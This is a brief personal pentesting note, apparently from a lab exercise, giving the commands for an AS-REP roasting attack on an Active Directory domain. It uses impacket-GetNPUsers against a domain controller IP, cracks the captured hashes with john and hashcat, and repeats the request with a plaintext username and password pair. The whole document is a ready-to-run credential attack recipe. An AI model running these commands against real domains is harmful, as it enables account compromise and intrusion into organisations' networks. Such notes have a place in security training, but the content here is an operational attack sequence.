# ASPREPRoast AD

```bash
# ASREPRoast using employees list
impacket-GetNPUsers -dc-ip 172.16.2.5 DANTE.ADMIN/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

# Cracking hashes
john --wordlist=passwords_kerb.txt hashes.asreproast 
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

# ASREPRoast again with user and password
impacket-GetNPUsers -dc-ip 172.16.2.5 DANTE.ADMIN/jbercov:myspace7 -request -format hashcat -outputfile hashes.asreproast2
```